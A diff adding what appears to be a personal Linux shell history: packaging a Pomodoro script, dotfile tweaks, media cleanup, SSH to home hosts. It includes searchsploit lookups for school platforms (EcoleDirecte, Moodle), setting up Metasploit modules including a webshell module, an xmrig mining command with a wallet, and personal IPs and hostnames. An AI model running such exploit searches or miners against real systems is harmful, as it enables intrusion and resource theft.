@@ -1,0 +1,1003 @@
+chmod +x .config/i3/polybar/script/polybar_pomodoro.sh 
+sh .config/i3/polybar/script/polybar_pomodoro.sh
+vim .config/i3/Script/script/toggle_pomodoro.sh
+scrot -s
+rm -rf /tmp/pomostat
+sleep 5
+vim .config/i3/polybar/script/polybar_pomodoro.sh
+./GIT/Pomodoro/pomodoro.py
+./GIT/Pomodoro/pomodoro.py Start
+./GIT/Pomodoro/pomodoro.py Stop
+pomodoro.py Stop
+cat /tmp/pomostat
+cp GIT/Pomodoro/pomodoro.py .local/bin/pomodoro.py
+ga readme.md
+gcm "update Readme"
+ga pomodoro.py
+gcm "fucked up my brain (but it work with polybar)"
+vim GIT/Pomodoro/pomodoro.py
+vim .local/bin/pomodoro.py
+file a.out
+rm -rf a.out
+feh
+rm -rf 2021-05-11-185633_175x23_scrot.png 2021-05-12-091122_356x317_scrot.png 2021-05-12-102756_172x148_scrot.png 2021-05-12-105936_3046x1050_scrot.png 2021-05-12-105941_3046x1050_scrot.png 2021-05-12-105944_3046x1050_scrot.png 2021-05-12-105946_3046x1050_scrot.png 2021-05-12-183151_178x28_scrot.png 2021-05-12-183134_171x30_scrot.png  2021-05-12-184303_180x38_scrot.png
+sudo pacman -Q python3
+sudo pacman -Q python3.8
+sudo pacman -Qc python3.8
+sudo pacman -Qc python3
+sudo pacman -Qc python
+sudo pacman -Qk python
+sudo pacman -Qv python
+sudo pacman -Qn python
+sudo pacman -Qnm python
+md5sum GIT/Pomodoro
+cd pomodoro.py
+zip pomodoro.py_1.0.zip -r -9 pomodoro.py
+zip pomodoro.py_1.0.zip -r -9 install.sh
+x pomodoro.py_1.0.zip
+ls pomodoro.py_1.0
+rm -rf pomodoro.py_1.0
+sudo pacman -Q libnotify
+sudo pacman -Q ttf-font-awesome
+trizen pomodoro
+ls src/
+ls src/pomodoro.py_1.0.zip
+rm -rf pomodoro.py_1.0.zip src
+x pomodoro.py-1.0-1-any.pkg.tar.zst
+rm -rf pkg pomodoro.py-1.0-1-any.pkg.tar.zst pomodoro.py_1.0.zip src
+rm -rf .BUILDINFO .PKGINFO .MTREE
+vim src/install.sh
+rm -rf ~/.local/bin/pomodoro.py
+rm -rf pkg pomodoro.py-1.0-1-any.pkg.tar.zst src pomodoro.py_1.0.zip 
+ls ~/.local/bin
+humanfriendly
+rm -rf pkg pomodoro.py-1.0-1-any.pkg.tar.zst src pomodoro.py_1.0.zip
+ga "pkgbuil 1.0"
+gcm "pkgbuild 1.0"
+l
+sls
+git diff pomodoro.py
+gcm "set Minute = 60 sec"
+gb pkgbuild
+makepkg-template
+pkgconf
+rm -rf *
+gck pkgbuild
+touch PKGBUILD
+makepkg 
+ga 
+gp origin pkgbuild
+gp origin -D pkgbuild
+gp -D origin origin/pkgbuild
+git remote add aur
+git remote add aur aur@aur.archlinux.org:pomodoro
+gp aur pkgbuild
+gc ssh://aur@aur.archlinux.org/pomodoro.py
+mv PKGBUILD pomodoro.py
+mv pomodoro.py ../
+gb -D pkgbuild
+gp origin origin/pkgbuild
+gp -D origin pkgbuild
+gp -d origin pkgbuild
+cd ///
+cd GIT/pomodoro.py
+cat PKGBUILD
+cat .SRCINFO
+ga PKGBUILD .SRCINFO
+gcm "work on pkgbuild"
+ld
+cp -r pomodoro.py /tmp/test
+cd /tmp/test
+rm -rf src
+rm -rf .part
+makepkg --printsrcinfo > .SRCINFO
+ga .SRCINFO
+gcm "update .SCR"
+cd /tmp
+gc https://aur.archlinux.org/pomodoro.git
+cd pomodoro
+cd GIT/
+rm -r pomodoro.py
+rm -fr pomodoro.py
+rm -rf .local/bin/pomodoro.py
+trizen 
+trizen pomodoro.py
+ls .local/bin/pomodoro.py
+pomodoro.py
+cat GIT/Smart_Room/Wifi_led/Wifi_led_master/src/main.cpp
+de GIT/Smart_Room
+cd GIT/Smart_Room/Wifi_led/Wifi_led_master
+feh Master_led_scheme.jpg
+killall picom
+pidof picom
+vim .config/picom/picom.conf 
+gpg --receive-keys BE793007AD22DF7E
+trizen picom
+trizen compton
+cat .config/compton.conf
+mv .config/compton.conf .config/picom/picom.conf
+rm -rf .config/picom
+sudo pacman -S x11-utils
+sudo pacman -S xorg-utils
+sudo pacman -S xorg-xprop
+sudo pacman -S xorg-xwininfo
+picom-trans
+picom-trans -h
+picom-trans --help
+compton
+maim
+sudo pacman -S maim
+maim 
+maim --help
+maim -s
+maim -s test
+feh test
+feh Pictures/Screenshot_2021-05-14_11-10.png 
+maim -s Pictures/Screenshot_$(date+"%F")_$(date+"%H-%M).png
+maim -s Pictures/Screenshot_$(date+"%F")_$(date+"%H-%M").png
+rm -rf test Pictures/Screenshot_2021-05-14_11-10.png Pictures/Screenshot_2021-05-14_11-14.png Pictures/Screenshot__.png 
+ls feh_046964_000001_Screenshot_2021-05-14_11-15.png
+feh feh_046964_000001_Screenshot_2021-05-14_11-15.png
+rm -rf feh_046964_000001_Screenshot_2021-05-14_11-15.png
+ls Pictures/Screenshot_2021-05-14_11-15.png 
+rm Pictures/Screenshot_2021-05-14_11-15.png 
+sudo pacman -S scrop
+sudo pacman -S scrot
+scrot --help
+ls GIT/setup_arch/src
+feh Pictures
+ls Pictures
+feh Pictures/Screenshot_2021-05-14_11-21.png
+trizen map2
+gc ssh://aur@aur.archlinux.org/map2
+vim PKGBUILD PKGBUILD
+rustup default stable
+vim GIT/setup_arch/src/Archlinux
+ls /tmp/trizen-kawaegle/map2
+ls /tmp/trizen-kawaegle/map2/src
+ls /tmp/trizen-kawaegle/map2/
+ls /tmp/trizen-kawaegle/map2/*
+sha256sum /tmp/trizen-kawaegle/map2/1.0.4.tar.gz
+cd map2
+ls pkg
+sudo ls pkg
+sudo ls src/
+sudo ls src/map2-1.0.4/
+vim PKGBUILD
+makepkg
+sudo pacman -S duf
+trizen -S duf
+sudo rm -rf 1.0.4.tar.gz pkg src
+trizen koneko
+mpv
+sudo pacman -S mpv
+ls .config/mpv
+rm -rf .config/mpv
+cp -r GIT/Dotfile/dotfile/mpv .config/mpv
+rm -rf Downloads/Mahouka\ Koukou\ no\ Rettousei/Saison\ 01/Mahouka\ Koukou\ no\ Rettousei\ S01\ E01.mp4
+rm -rf Downloads/Mahouka\ Koukou\ no\ Rettousei/Saison\ 01/Mahouka\ Koukou\ no\ Rettousei\ S01\ E02.mp4
+rm -rf Downloads/Mahouka\ Koukou\ no\ Rettousei/Saison\ 01/Mahouka\ Koukou\ no\ Rettousei\ S01\ E03.mp4 Downloads/Mahouka\ Koukou\ no\ Rettousei/Saison\ 01/Mahouka\ Koukou\ no\ Rettousei\ S01\ E04.mp4 Downloads/Mahouka\ Koukou\ no\ Rettousei/Saison\ 01/Mahouka\ Koukou\ no\ Rettousei\ S01\ E05.mp4 Downloads/Mahouka\ Koukou\ no\ Rettousei/Saison\ 01/Mahouka\ Koukou\ no\ Rettousei\ S01\ E06.mp4 Downloads/Mahouka\ Koukou\ no\ Rettousei/Saison\ 01/Mahouka\ Koukou\ no\ Rettousei\ S01\ E07.mp4 Downloads/Mahouka\ Koukou\ no\ Rettousei/Saison\ 01/Mahouka\ Koukou\ no\ Rettousei\ S01\ E08.mp4 Downloads/Mahouka\ Koukou\ no\ Rettousei/Saison\ 01/Mahouka\ Koukou\ no\ Rettousei\ S01\ E09.mp4 
+qbittorrent
+trizen minecraft
+cat GIT/Projet/Revue_De_Projet.md
+Blocked
+sudo openvpn Downloads/USA_freeopenvpn_udp.ovpn
+rm -rf Downloads/USA_freeopenvpn_udp.ovpn
+sudo openvpn Downloads/ro1.vpnjantit.com.zip
+cd ro1.vpnjantit.com
+rm -rf Downloads/ro1.vpnjantit.com.zip ro1.vpnjantit.com
+x Downloads/ro1.vpnjantit.com.zip
+cd ro1.vpnjantit.com/ro1.vpnjantit.com
+sudo openvpn ro1.vpnjantit.com\ 1194\ UDP.ovpn
+cat .zsh/alias
+trizen pi
+trizen picoin
+trizen exodus
+trizen faucetpay
+sudo mount /dev/sdb1 /run/media
+sudo umount /run/media
+cd Downloads/Mahouka\ Koukou\ no\ Rettousei/Saison\ 01
+rm -rf Mahouka\ Koukou\ no\ Rettousei\ S01\ E10.mp4 Mahouka\ Koukou\ no\ Rettousei\ S01\ E11.mp4 Mahouka\ Koukou\ no\ Rettousei\ S01\ E12.mp4 Mahouka\ Koukou\ no\ Rettousei\ S01\ E13.mp4 Mahouka\ Koukou\ no\ Rettousei\ S01\ E14.mp4 Mahouka\ Koukou\ no\ Rettousei\ S01\ E15.mp4 Mahouka\ Koukou\ no\ Rettousei\ S01\ E16.mp4 Mahouka\ Koukou\ no\ Rettousei\ S01\ E17.mp4 Mahouka\ Koukou\ no\ Rettousei\ S01\ E18.mp4 Mahouka\ Koukou\ no\ Rettousei\ S01\ E19.mp4 
+rm -rf Mahouka\ Koukou\ no\ Rettousei\ S01\ E20.mp4 
+rm -rf Mahouka\ Koukou\ no\ Rettousei\ S01\ E21.mp4
+def
+duf ../
+df -h 
+vlc Downloads/Girls.und.Panzer.der.Film.2018.BluRay.VOSTFR.1080p.x264.DTSHD-MA.5.1-R3D/Girls.und.Panzer.der.Film.2018.BluRay.VOSTFR.1080p.x264.DTSHD-MA.5.1-R3D.mkv
+rm -rf Downloads/Mahouka\ Koukou\ no\ Rettousei/ Downloads/Girls\ und\ panzer\ serie
+koneko
+koneko nyaa 
+blueman-manager
+bluetoothctl
+ls Downloads/\[SR-71\]\ Horimiya\ S01\ VOSTFR\ \[1080p\]\[X265\]\[10BITS\]
+ping 8.8.8.8
+trizen ratake
+chmod +x .zsh/plugins/streaming
+streaming
+xrandr
+streaming live_447195491_KffQsGBlLW4bAqzSGXQMWCEv0RAf0o
+vim .zsh/plugins/streaming
+ffmpeg
+
+rm -rf .zsh/plugins/streaming
+ssh-connect
+cp  .config/i3/Script/script/toggle_pomodoro.sh GIT/Pomodoro/
+vim GIT/Pomodoro
+cp .config/i3/polybar/script
+cp .config/i3/polybar/script/polybar_pomodoro.sh GIT/Pomodoro/
+ls GIT/Pomodoro
+rm -rf GIT/Pomodoro/pomodoro.py_1.0.zip GIT/Pomodoro/src
+cd GIT/Pomodoro
+ga
+vim readme.md
+gcm "add workflows for polybar"
+udisksctl
+pgrep spotify -x
+3*60
+python
+cat .config/nvim/after/ftplugin/c.vim
+cat .config/nvim/after/ftplugin/python.vim
+vim .config/nvim/init.vim
+chmod +x .config/i3/Script/script/toggle_redshift.sh 
+chmod +x .config/i3/Script/script/toggle_redshift.sh
+notify-send "test moi"
+./.config/i3/Script/script/toggle_redshift.sh test
+echo $REDSHIFT
+ls .cache/redshift
+cat .config/i3/polybar/script/polybar_pomodoro.sh
+cat .config/i3/Script/script/toggle_pomodoro.sh
+sudo pacman -S redshift
+cat .config/nvim/init.vim 
+cat .config/nvim/modules/keymap.vim
+cat .cache/redshift
+./.config/i3/Script/script/toggle_redshift.sh
+redshift -O 10000
+redshift -O 700
+redshift -O 7000
+redshift -O 12000
+redshift -O 5600
+redshift
+redshift -h
+redshift -O 4500
+redshift -O 5600 -P
+redshift -O 1600 -P
+redshift -O 3600 -P
+redshift -O 500 -P
+redshift -O 5000 -P
+redshift -O 5500 -P
+redshift -O 4500 -P
+redshift -x
+rm -rf .cache/redshift
+vim .config/nvim/after/ftplugin/sh.vim
+vim Test.sh
+rm -rf Te
+rm -rf Test.sh
+wq
+sudo pacman -S python3-nvim
+sudo pacman -S pynvim
+pip install pynvim
+vim .config/i3/Script/script/toggle_redshift.py
+sudo pacman -S jq
+sudo pacman -S udisk2
+sudo pacman -S udisks2
+playerctld
+playerctl --player=spotify metadata --format "{{title}}"
+playerctl --player=spotify metadata --format "{{title}} -- {{artiste}}"
+if [[ $stat == 0 ]]; then printf "pomo work"; pomodoro.py Stop; else printf "pomo down"i; pomodoro.py Start;fi
+playerctl --player=spotify metadata --format "{{title}} -- {{artist}}"
+playerctl --player=spotify status
+vim .config/i3/Script/script/toggle_redshift.sh
+trizen zscrool
+trizen zscrol
+zscroll
+pgrep -a "polybar"
+vim .config/i3/polybar/script/polybar_spotify_scroll.sh
+mv .config/i3/polybar/script/polybar_spotify.sh .config/i3/Script/script/spotify_status.sh
+mv .config/i3/polybar/script/polybar_spotify_scroll.sh .config/i3/polybar/script/polybar_spotify.sh
+chmod +x .config/i3/polybar/script/polybar_spotify.sh 
+polybar -h
+polybar -c .config/i3/polybar/config main
+./.config/i3/polybar/script/polybar_spotify.sh
+trizen orpi
+ping 89.159.142.248
+myip
+ping 192.168.0.11
+sudo netdiscover
+ping 192.168.0.14
+ssh oppaiweeb.ddns.net
+ssh 89.159.142.249
+ssh 89.159.142.248
+sudo pacman -Syu
+cat Downloads/_one_16211815626228_917.txt
+trizen voicemode
+trizen xmrig
+xmrig
+xmrig 
+xmrig xmrig -o pool.minexmr.com:4444 -u 
+xmrig xmrig -o pool.minexmr.com:4444 -u 46gv53KjB4DT62yYiyMPXb7cqxikhZFvRgvAQLb5Bd8JcKf4o7cdE4xNvVr5RtHq4bKeLtbtYnmwCaZ9SCECX4VY3NUVhwb
+mantablockscreen
+vim GIT/setup_arch/src/DE 
+trizen ghostwrite
+vim Girls\ und\ Panzer\ \(BD\ 1080p\ DTS\ 5.1\ 10bits\ Vostfr\).torrent
+trien torch
+trizen torsh
+trizen torch
+rm -rf Downloads/music.zip
+ask linux/"rclone copy" 
+rl -rf music.zip
+sudo pacman -S rclone
+rclone config
+rclone copyto google:/music.zip music.zip
+rclone copyto -v google:/music.zip music.zip
+rclone google
+rclone 
+rclone ls google:
+rclone copy google:/music.zip 
+rclone copy google:/music.zip music.zip --verbose
+x music.zip/music.zip 
+ls music
+rm -rf music.zip/music.zip
+mv music Music
+ls music.zip
+rm -rf music.zip
+cd \[Houkago-Fansub\]\ Girls\ und\ Panzer\ \[BD\ 1080p\ DTS\ 10bits\ Vostfr\]
+vlc \[Houkago-Fansub\]\ Girls\ und\ Panzer\ -\ 02\ \[BD\ 1080p\ DTS\ 10bits\ Vostfr\].mkv
+rm -rf \[Houkago-Fansub\]\ Girls\ und\ Panzer\ \[BD\ 1080p\ DTS\ 10bits\ Vostfr\]
+ssh root@192.168.0.18
+ssh root@192.168.0.18 -P 2222
+ssh root@192.168.0.18 -p 2222
+rm -rf Documents/*
+sudo pacman -S calbre
+sudo pacman -S calibre
+calibre
+cat .ssh/config
+ssh-P 2222  root@192.168.0.18
+ssh -P 2222 root@192.168.0.18
+ssh -p 2222 root@192.168.0.18
+scp -p 2222 -r root@192.168.0.18:/mnt/onboard/book/ Documents
+scp -P 2222 -r root@192.168.0.18:/mnt/onboard/book/ Documents
+scp -P 2222 -r root@192.168.0.18:/mnt/onboard/book/ Documents/
+scp -P 2222 -r root@192.168.0.18:/mnt/onboard/book/ /tmp/
+mv /tmp/book/* Documents
+trizen komikku
+trizen teams
+rm -rf Girls.und.Panzer.der.Film.2018.BluRay.VOSTFR.1080p.x264.DTSHD-MA.5.1-R3D
+rm -rf _one_16211815626228_917.txt ro1.vpnjantit.com.zip
+rm -rf Downloads/Untraceable.2008.FRENCH.BRRip.XviD.AC3-NoTag
+kill $(pidof firefox)
+trizen obs
+trizen obs-studio
+vim GIT/setup_arch/src/AURInstall
+vim GIT/setup_arch/src/multi
+vim .config/nvim/modules/markdown.vim
+vim .config/nvim/modules/snippet.vim
+vim .config/nvim/snippet
+vim .config/nvim/modules/keymap.vim
+sudo pacman -S nodejs
+marp GIT/Projet/RP_Presentation.md
+marp RP_Presentation.md
+vim GIT/Projet/RP_Presentation.md
+cd GIT/Projet
+rm -rf RP_Presentation.html RP_Presentation.md 
+ga Presentation.odp Revue_De_Projet.md RP_Presentation.md src/Schéma\ fonctionnel\ Luchrone.pdf
+git remote get-url origin
+git remote set-url origin oppai.ddns.net:/GIT/Projet
+zathura src/Sch\#U00e9ma\ fonctionnel\ Luchrone.pdf
+gcm "almost finish that shit"
+ssltap
+rsync
+rsync --human-readable --progress --update -r -z ~/Music kawaegle@oppai.ddns.net:/home/kawaegle/Music
+vim .ssh/config
+vim /tmp/main.c
+cp Templates/Prog/c.c .
+mv c.c main.c
+make MakeFile
+make MakeFilels
+playerctl -player spotify next
+playerctl --player spotify next
+ping 8.8.4.4
+trizen blackmagic
+sudo vim /etc/fstab
+sudo nvim /etc/fstab
+x Downloads/papier.zip 
+zathura papier/papier/impot/img-323111143-0001.pdf
+zathura papier/papier/impot/*
+zathura papier/papier/impot/
+zathura Downloads/Numérisation_20210518\ \(2\).pdf
+pdfunite Downloads/Numérisation_20210518\ \(2\).pdf Downloads/Numérisation_20210518\ \(3\).pdf identity.pdf
+zathura identity.pdf
+trizen davinci
+vimdot
+vim .zshrc
+ks
+gc git@github.com:OppaiWeeb/C_learn
+cd Pomodoro
+vim Pomodoro/readme.md
+cd Projet
+rm -rf .\~lock.Presentation.odp\#
+gcm "update Porjet"
+ls ~/
+cd setup_arch
+git diff 7593c14
+git fetch origin epitech
+gp origin origin
+git branch -a
+gitk --all
+sudo pacman -S wish
+gcm "work on change"
+git remote set-url git@github.com:kawaegle/setup_arch
+git remote set-url orign  git@github.com:kawaegle/setup_arch
+git remote set-url origin  git@github.com:kawaegle/setup_arch
+git checkout epitech
+python3 -m "http.server 8080"
+python3 -m "http.server" 8080
+python3 -m "http.server" 80
+sudo python3 -m "http.server" 80
+vim Downloads/Firefox\ Setup\ 88.0.1.exe firefox.exe
+mv Downloads/Firefox\ Setup\ 88.0.1.exe firefox.exe
+mv Downloads/python-3.9.5-amd64.exe python3.exe
+mv Downloads/VSCodeSetup-x64-1.56.2.exe vscode.exe
+pacman -Rsnuc rclone
+sudo pacman -Rsnuc rclone
+trizen twitch
+ls Girls\ und\ Panzer\ \(BD\ 1080p\ DTS\ 5.1\ 10bits\ Vostfr\).torrent
+wc Girls\ und\ Panzer\ \(BD\ 1080p\ DTS\ 5.1\ 10bits\ Vostfr\).torrent
+rm -rf firefox.exe ro1.vpnjantit.com python3.exe Romanowski_alexandre.pdf vscode.exe 
+vim /tmp/serverauth.md
+searchsploit ecoledirect
+ls .local/share/Mindustry/
+ls .local/share/Mindustry/saves
+ls .local/share/Mindustry/settings.bin
+cat .local/share/Mindustry/settings.bin
+cat .local/share/Mindustry/settings.log
+rm -rf .local/share/Mindustry
+vim GIT/Smart_Room/<
+vim GIT/setup_arch/start.sh
+rm -rf Girls\ und\ Panzer\ \(BD\ 1080p\ DTS\ 5.1\ 10bits\ Vostfr\).torrent
+mkdir tmp/
+mv main.c MakeFile tmp
+vim main.c
+searchsploit moodle
+ls go/pkg/
+ls go/pkg
+ls go
+rm -rf go
+htop$
+vim MakeFile
+cat .config/ranger/commands.py
+scp -r oppai.ddns.net:/home/kawaegle/School School
+scp -r oppai.ddns.net:/home/kawaegle/ROM School
+ls School
+mv School/ROM .
+rm -rf .config/ranger
+cp -r GIT/Dotfile/dotfile/ranger/ ~/.config
+cat .config/ranger/rc.conf
+cat .config/ranger/scope.sh
+cat .config/ranger/rifle.conf
+vim GIT/setup_arch/src/DE
+sudo pacman -S ueberzug
+touch Templates/Prog/MakeFile
+trizen miasm
+cat Downloads/2048
+chmod +x Downloads/2048
+cd tmp
+gencat
+gencat -h
+gencat --help
+gendict
+genkeys
+1
+0
+return 0
+make
+make_torrent
+..
+./2048
+ggba
+gb -all
+gck learn_C
+cat Learn.md
+vim Learn.md
+cd GIT/C_learn
+gcm "use casual markdown"
+vim .config/i3/polybar/script/polybar_bluetooth.sh
+cd GIT
+ranger
+ask linux/speedtest
+vim .zsh/alias
+./Downloads/2048
+speedtest $
+speedtest
+vim .config/nvim/snippet/markdown.snippets
+vim .config/nvim/snippet/c.snippets
+gc git@github.com:OppaiWeeb/Horlengre
+cd Horlengre
+gb --al
+gb --all
+gck origin/1.3.9
+python3 App.py
+python App.py
+vim App.py
+gck origin/1.4.b
+vim Magasin.py
+ssh kawaegle@oppai.ddns.net
+vim .config/i3/polybar/script/polybar_spotify.sh
+vim .config/i3/Script/script/spotify_status.sh
+xprop
+kill $(pidof code)
+kill $(pidof teams-for-linux)
+kill $(pidof electron)
+vim /tmp/pomostat
+nmcli --color yes device wifi
+sudo pacman -Syy
+sudo pacman -S fzf
+nmcli --color yes device wifi | fzf --ansi --height=40% --reverse --scycle --inline-info --header-lines=1
+nmcli --color yes device wifi | fzf --ansi --height=40% --reverse --cycle --inline-info --header-lines=1
+trizen streamlab
+ping oppai.ddns.net
+ssh pi@user35p74a.ddns.net
+ssh Oppaiweb.ddns.net
+ssh oppaiweb.ddns.net
+ssh user35p74a.ddns.net
+ping user35p74a.ddns.net
+wine Downloads/Streamlabs+OBS+Setup+1.1.2-M1DAIWbhgWradoZ.exe 
+start
+sudo pacman -S gparted
+sudo gparted
+picom
+vlc Videos/2021-05-23\ 22-13-51.mp4
+vlc Videos/2021-05-23\ 21-29-54.mp4
+rm -rf Videos/2021-05-23\ 21-24-30.mp4 Videos/2021-05-23\ 21-25-51.mp4 Videos/2021-05-23\ 21-25-57.mp4 Videos/2021-05-23\ 21-27-17.mp4 Videos/2021-05-23\ 21-29-54.mp4 Videos/2021-05-23\ 22-13-51.mp4 
+ls Videos
+vlc Videos/2021-05-23\ 22-16-52.avi
+mkdir .config/picom
+kill $(pidof obs)
+xbacklight -h
+xbacklight -set 50
+xbacklight -set 10
+xbacklight -set 30
+vim .config/picom/picom.conf
+vim .config/i3/config
+koneko nyaa
+ls Documents/
+rm -rf Downloads/Le_live_va_bientot.mp4
+rm -rf Horlengre
+rm -rf Music
+mv SK8\ the\ Infinity\ -\ 07\ VOSTFR\ \[1080p\].mkv SK8_the_infinity_VOSTFR_07.mkv
+mv \[NC-Raws\]\ SK8\ the\ Infinity\ -\ 09.5\ \[WEB-DL\]\[1080p\]\[AVC\ AAC\]\[CHT\]\[MP4\].mp4 SK8_the_infinity_VOSTFR_09.5.mkv
+mv SK8_the_infinity_VOSTFR_09.5.mkv SK8_the_infinity_VOSTFR_09.5.mp4
+lsblk
+kill $(pidof qbittorrent)
+rm -rf \(Lilith-Raws\)\ SK8\ the\ Infinity\ -\ 10\ \(Baha\)\(WEB-DL\)\(1080p\)\(AVC\ AAC\)\(CHT\)\(MP4\).torrent \(Lilith-Raws\)\ SK8\ the\ Infinity\ -\ 11\ \(Baha\)\(WEB-DL\)\(1080p\)\(AVC\ AAC\)\(CHT\)\(MP4\).torrent \(Lilith-Raws\)\ SK8\ the\ Infinity\ -\ 12\ \(Baha\)\(WEB-DL\)\(1080p\)\(AVC\ AAC\)\(CHT\)\(MP4\).torrent \(NC-Raws\)\ SK8\ the\ Infinity\ -\ 04\ \(WEB-DL\)\(1080p\)\(AVC\ AAC\)\(CHT\)\(MP4\).torrent \(NC-Raws\)\ SK8\ the\ Infinity\ -\ 09.5\ \(WEB-DL\)\(1080p\)\(AVC\ AAC\)\(CHT\)\(MP4\).torrent \(Ore\)\ SK8\ the\ Infinity\ -\ 08\ VOSTFR\ \(SOFTSUB\)\(1080p\)\(HEVC-265\ 10bit\).torrent \(Ore\)\ SK8\ the\ Infinity\ -\ 09\ VOSTFR\ \(SOFTSUB\)\(1080p\)\(HEVC-265\ 10bit\).torrent SK8\ the\ Infinity\ -\ 02\ VOSTFR\ \(SOFTSUB\)\(1080p\)\(HEVC-265\ 10bit\).torrent SK8\ the\ Infinity\ -\ 03\ VOSTFR\ \(SOFTSUB\)\(1080p\)\(HEVC-265\ 10bit\).torrent SK8\ the\ Infinity\ -\ 04\ VOSTFR\ \(SOFTSUB\)\(1080p\)\(HEVC-265\ 10bit\).torrent SK8\ the\ Infinity\ -\ 05\ VOSTFR\ \(SOFTSUB\)\(1080p\)\(HEVC-265\ 10bit\).torrent SK8\ the\ Infinity\ -\ 06\ VOSTFR\ \(SOFTSUB\)\(1080p\)\(HEVC-265\ 10bit\).torrent SK8\ the\ Infinity\ -\ 07\ VOSTFR\ \(SOFTSUB\)\(1080p\)\(HEVC-265\ 10bit\).torrent \(Tsundere-Raws\)\ SK8\ the\ Infinity\ -\ 01\ VOSTFR\ \(WAKA\ 720p\).mkv.torrent
+rm -rf Downloads/\[Lilith-Raws\]\ SK8\ the\ Infinity\ -\ 10\ \[Baha\]\[WEB-DL\]\[1080p\]\[AVC\ AAC\]\[CHT\]\[MP4\].mp4 Downloads/\[Lilith-Raws\]\ SK8\ the\ Infinity\ -\ 11\ \[Baha\]\[WEB-DL\]\[1080p\]\[AVC\ AAC\]\[CHT\]\[MP4\].mp4 Downloads/\[Lilith-Raws\]\ SK8\ the\ Infinity\ -\ 12\ \[Baha\]\[WEB-DL\]\[1080p\]\[AVC\ AAC\]\[CHT\]\[MP4\].mp4 Downloads/\[NC-Raws\]\ SK8\ the\ Infinity\ -\ 04\ \[WEB-DL\]\[1080p\]\[AVC\ AAC\]\[CHT\]\[MP4\].mp4 Downloads/SK8\ the\ Infinity\ -\ 04\ VOSTFR\ \[SOFTSUB\]\[1080p\]\[HEVC-265\ 10bit\].mkv Downloads/SK8_the_infinity_VOSTFR_09.5.mp4 Downloads/SK8_the_infinity_VOSTFR_07.mkv Downloads/SK8\ the\ Infinity\ -\ 02\ VOSTFR\ \[1080p\].mkv Downloads/\[Tsundere-Raws\]\ SK8\ the\ Infinity\ -\ 01\ VOSTFR\ \[WAKA\ 720p\].mkv
+vim .Xresources
+mkdir Grand_Oral
+mv Downloads/Q1.webm Downloads/Q2.webm Downloads/Question1.pdf Downloads/question2.pdf Grand_Oral
+rm -rf Downloads/\[SR-71\]\ Horimiya\ S01\ VOSTFR\ \[1080p\]\[X265\]\[10BITS\] Downloads/Streamlabs+OBS+Setup+1.1.2-M1DAIWbhgWradoZ.exe
+vim
+mkdir Avenir
+mv Avenir.ods Avenir
+mv identity.pdf Avenir/Carte_id.pdf
+zathura Downloads/document.pdf
+mv Downloads/document.pdf Avenir/epitech.pdf
+zathura Downloads/Notification.pdf
+zathura Downloads/Numérisation_20210518\ \(3\).pdf
+rm -rf Downloads/Numérisation_20210518\ \(2\).pdf Downloads/Numérisation_20210518\ \(3\).pdf Downloads/Numérisation_20210518.pdf
+mv Downloads/impot-20211805222121.pdf Avenir
+mv Downloads/Notification.pdf Avenir/Bourse.pdf
+ls Avenir
+zathura Avenir
+zathura Avenir/*
+vim 
+htop
+nmtui
+mount /dev/sdb1 /mnt
+sudo mount /dev/sdb1 /mnt
+ls /mnt
+cp GIT/Projet/Presentation.odp /mnt
+sudo umount /mnt
+mv scene scene.json
+cat scene.json
+scp -r oppai.ddns.net:/home/kawaegle/ovpn/kawaegle.ovpn .
+vim kawaegle.ovpn
+trizen -Syu
+nmap -p 22,1194 
+nmap -p 22,1194 oppai.ddns.net
+zathura Downloads/VisaCertifie-V10274529314.pdf
+mv Downloads/VisaCertifie-V10274529314.pdf Avenir
+rm -rf kawaegle.ovpn scene.json
+code
+gc github.com:OppaiWeeb/Oppaipack
+ls papier
+ls papier/papier
+mv papier/papier Avenir
+rm -rf papier
+mv Oppaipack G
+mv G GIT
+mv GIT/G GIT/OppaiPack
+ls .cache
+file .cache/i3lock/current
+file .cache/i3lock/1366x768
+ls .cache/i3lock/1366x768
+ls .cache/i3lock/current
+ls .cache/
+trizen i3lock
+trizen imhex
+gc git@github.com:Azermadness/arduino GIT/
+cd GIT/arduino
+gck origin/Kawaegle
+gck Kawaegle
+gp --delete origin Kawaegle
+gb -D Kawaegle
+touch README.md && git add README.md
+ga README.md
+gcm "add readme"
+rm -rf arduino
+git revert
+git revert dac973a
+cat config/config.rb 
+git fetch origin 
+./mad-metasploit
+git clean
+git fetch
+git pull
+git pull origin
+git reset origin/master
+ls mad-metasploit-modules
+ls mad-metasploit-modules/auxiliary
+rm -rf map2
+rm -rf mad-metasploit/
+ls tmp
+touch tmp/main.h
+touch tmp/addme.h
+touch tmp/addme.c
+gc git@github.com:Azermadness/arduino GIT/arduino
+pip install -r GIT/setup_arch/src/pip_requiere.txt
+whereis metaflac
+whereis msfd
+find / metasploit
+find / -name metasploit
+sudo find / -name metasploit
+man find
+find / -d -name meta
+sudo find / -d -name metasploit
+sudo find / -D -name metasploit
+sudo find / -type d -name metasploit
+vim mad-metasploit/config/config.rb 
+sudo ls /opt/metasploit/modules/auxiliary/mad_metasploit/auxiliary/scanner/http/fingerprint.rb
+sudo vim /opt/metasploit/modules/auxiliary/mad_metasploit/auxiliary/scanner/http/fingerprint.rb
+sudo nvim /opt/metasploit/modules/auxiliary/mad_metasploit/auxiliary/scanner/http/fingerprint.rb
+vim config/config.rb 
+git revert origin/master
+gck origin/master
+git reset --hard
+git push
+git whatchanged
+vim mad-metasploit-modules/exploits/netspi/ps_webshells.rb config/config.rb 
+vim mad-metasploit-modules/exploits/netspi/ps_webshells.rb 
+gb test
+git stash 
+gb
+vim config
+gck dac973a 
+git add config/config.rb config/
+gcm "add path for metasploit"
+vim mad-metasploit-modules/exploits/netspi/ps_webshells.rb
+ga mad-metasploit-modules/exploits/netspi/ps_webshells.rb
+gcm "duplicate Platform line 24 27"
+gck master
+sudo ./mad-metasploit
+sudo msfdb -h
+sudo pacman -S metasploit
+msfupdate
+trizen msfupdate
+ls /opt/metasploit/
+ls /opt/metasploit/msfconsole
+cat /opt/metasploit/msfconsole
+cat /opt/metasploit/lib/rex
+cat /opt/metasploit/lib/rex.rb 
+cat /opt/metasploit/modules/auxiliary/mad_metasploit/auxiliary/scanner/http/fingerprint.rb 
+head /opt/metasploit/modules/auxiliary/mad_metasploit/auxiliary/scanner/http/fingerprint.rb 
+ls /opt/metasploit/modules/auxiliary/mad_metasploit
+ls /opt/metasploit/modules/auxiliary/mad_metasploit/auxiliary
+vim /opt/metasploit/modules/exploits/mad_metasploit/exploits/netspi/ps_webshells.rb
+sudo nvim /opt/metasploit/modules/exploits/mad_metasploit/exploits/netspi/ps_webshells.rb
+rm -rf .msf4
